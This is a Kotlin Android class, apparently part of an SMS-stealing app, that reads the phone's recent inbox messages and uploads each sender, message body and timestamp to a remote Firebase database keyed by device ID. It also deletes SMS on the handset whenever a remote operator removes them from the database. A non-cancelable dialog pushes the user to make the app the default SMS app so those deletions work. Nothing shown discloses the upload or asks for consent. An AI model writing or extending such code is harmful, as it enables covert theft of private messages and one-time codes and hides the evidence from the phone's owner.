package com.vplan.rxtprob

import android.content.Context
import android.content.DialogInterface
import android.net.Uri
import android.provider.Telephony
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AlertDialog
import com.google.firebase.database.*

class SmsSyncService(private val context: Context) {

    private val TAG = "SmsSyncService"

    private val deviceId: String = Settings.Secure.getString(
        context.contentResolver,
        Settings.Secure.ANDROID_ID
    ) ?: "unknown_device"

    private val smsRef: DatabaseReference =
        FirebaseDatabase.getInstance().getReference("sms").child(deviceId)

    // Upload initial SMS
    fun uploadInitialSms(limit: Int = 20) {
        try {
            val cursor = context.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null, null, null, "date DESC"
            )
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val id = it.getString(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                    val sender = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                    val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                    val smsData = mapOf(
                        "id" to id,
                        "sender" to sender,
                        "body" to body,
                        "timestamp" to date
                    )
                    smsRef.child(id).setValue(smsData)
                    count++
                }
            }
            Log.d(TAG, "✅ Uploaded initial SMS successfully")
        } catch (e: Exception) {
            Log.e(TAG, "⚠️ Upload error: ${e.message}")
        }
    }

    // Listen for Firebase deletion
    fun listenForFirebaseDeletion() {
        smsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildRemoved(snapshot: DataSnapshot) {
                val smsId = snapshot.key
                if (smsId != null) {
                    deleteSmsFromPhone(smsId)
                }
            }

            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase Listener error: ${error.message}")
            }
        })
    }

    // Delete SMS from phone (must delete)
    private fun deleteSmsFromPhone(smsId: String) {
        try {
            val defaultPkg = Telephony.Sms.getDefaultSmsPackage(context)
            Log.d(TAG, "Default SMS App = $defaultPkg, My App = ${context.packageName}")

            if (defaultPkg != context.packageName) {
                // Must be default SMS app to delete
                Log.e(TAG, "❌ Not default SMS app! Cannot delete SMS.")
                showDefaultAppPrompt()
                return
            }

            val uriSms = Uri.parse("content://sms")

            // Check SMS exists
            val cursor = context.contentResolver.query(uriSms, null, "_id=?", arrayOf(smsId), null)
            if (cursor == null || cursor.count == 0) {
                cursor?.close()
                Log.w(TAG, "⚠️ SMS not found or already deleted: ID=$smsId")
                return
            }
            cursor.close()

            // Delete SMS
            val deleted = context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
            if (deleted > 0) Log.d(TAG, "✅ SMS deleted: ID=$smsId")
            else Log.e(TAG, "❌ Could not delete SMS: ID=$smsId")

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error deleting SMS: ${e.message}")
        }
    }

    // Prompt user to set app as Default SMS
    private fun showDefaultAppPrompt() {
        val builder = AlertDialog.Builder(context)
        builder.setTitle("Set Default SMS App")
        builder.setMessage("To delete SMS, you must set this app as your default SMS app.")
        builder.setPositiveButton("Go to Settings") { _, _ ->
            val intent = android.content.Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.packageName)
            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
        }
        builder.setNegativeButton("Cancel") { dialog, _ -> dialog.dismiss() }
        builder.setCancelable(false)
        builder.create().show()
    }
}
